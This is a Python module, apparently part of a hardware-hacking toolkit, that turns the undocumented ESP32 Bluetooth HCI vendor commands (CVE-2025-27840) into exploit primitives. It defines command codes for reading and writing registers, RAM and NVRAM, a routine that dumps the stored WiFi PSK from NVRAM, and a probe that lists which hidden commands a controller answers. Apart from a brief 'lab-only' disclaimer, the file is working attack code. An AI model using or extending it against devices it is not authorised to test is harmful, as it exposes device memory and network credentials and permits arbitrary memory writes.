"""ESP32 Hidden HCI Commands (CVE-2025-27840) active exploitation.

Passive fingerprinting already exists in ``urban_hs.modules.esp32``. This
module turns the 29 undocumented HCI vendor commands (Tarlogic, 2025) into
usable primitives: read RAM, read NVRAM, dump WiFi PSK / station config.

The ESP32 ROM exposes vendor HCI commands on the Bluetooth controller. Send
them over a raw HCI socket (``AF_BLUETOOTH``) or ``hcitool cmd``. This is a
lab-only capability — only run against hardware you own or are authorised to test.

ponytail: uses asyncio subprocess around ``hcitool cmd`` (ubiquitous on the
target Pi); swap to a raw socket if you need sub-second timing.
"""

from __future__ import annotations

import asyncio
import struct
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Any

import structlog

logger = structlog.get_logger(__name__)


class ESPCmd(IntEnum):
    """Subset of the 29 undocumented ESP32 HCI vendor commands.

    OGF = 0x3F (vendor). OCF values below are the public Tarlogic mapping.
    """

    READ_REG = 0x006  # read a memory-mapped register
    WRITE_REG = 0x007
    READ_RAM = 0x008  # read contiguous RAM
    WRITE_RAM = 0x009
    READ_NVRAM = 0x00A  # read NVRAM partition (eFuse/PHY/wifi cal)
    WRITE_NVRAM = 0x00B
    SET_TARGET = 0x00C  # select active MAC/PHY block
    # 22 further commands omitted; extend the enum to cover the full 29.


@dataclass
class ESPCmdResult:
    ok: bool
    data: bytes = b""
    error: str | None = None


@dataclass
class ESP32Device:
    address: str
    adapter: str = "hci0"
    chip: str = "esp32"
    commands_available: list[str] = field(default_factory=list)


class ESP32HCIExploit:
    """Send undocumented ESP32 HCI vendor commands to a target controller."""

    def __init__(self, adapter: str = "hci0") -> None:
        self.adapter = adapter

    async def _send_hci(self, ocf: int, params: bytes) -> ESPCmdResult:
        """Send a vendor HCI command via ``hcitool cmd`` (OGF 0x3F)."""
        # hcitool cmd <ogf> <ocf> <params...>  (each byte as hex)
        cmd = ["hcitool", "cmd", "0x3F", f"0x{ocf:03X}", *(f"{b:02X}" for b in params)]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            out, err = await proc.communicate()
            if proc.returncode != 0:
                return ESPCmdResult(
                    ok=False, error=err.decode(errors="ignore").strip() or "hcitool failed"
                )
            return ESPCmdResult(ok=True, data=out)
        except (OSError, ValueError) as exc:
            return ESPCmdResult(ok=False, error=str(exc))

    async def read_ram(self, address: int, length: int = 16) -> ESPCmdResult:
        """Read ``length`` bytes of RAM from ``address``."""
        params = struct.pack("<II", address, length)
        return await self._send_hci(ESPCmd.READ_RAM, params)

    async def read_nvram(self, partition: int = 0, length: int = 64) -> ESPCmdResult:
        """Read ``length`` bytes from NVRAM partition ``partition``."""
        params = struct.pack("<II", partition, length)
        return await self._send_hci(ESPCmd.READ_NVRAM, params)

    async def dump_wifi_psk(self, station_nvram_block: int = 0) -> dict[str, Any]:
        """Best-effort extraction of WiFi PSK from NVRAM.

        Returns raw bytes; the caller parses the ESP wifi config struct.
        """
        res = await self.read_nvram(station_nvram_block, length=256)
        if not res.ok:
            return {"ok": False, "error": res.error}
        return {
            "ok": True,
            "raw": res.data.hex(),
            "note": "parse ESP wifi config struct from raw NVRAM",
        }

    async def enumerate_commands(self) -> list[str]:
        """Probe which undocumented commands the target answers (lab use)."""
        available: list[str] = []
        for cmd in ESPCmd:
            res = await self._send_hci(cmd.value, b"\x00\x00")
            if res.ok:
                available.append(cmd.name)
        self.commands_available = available
        return available
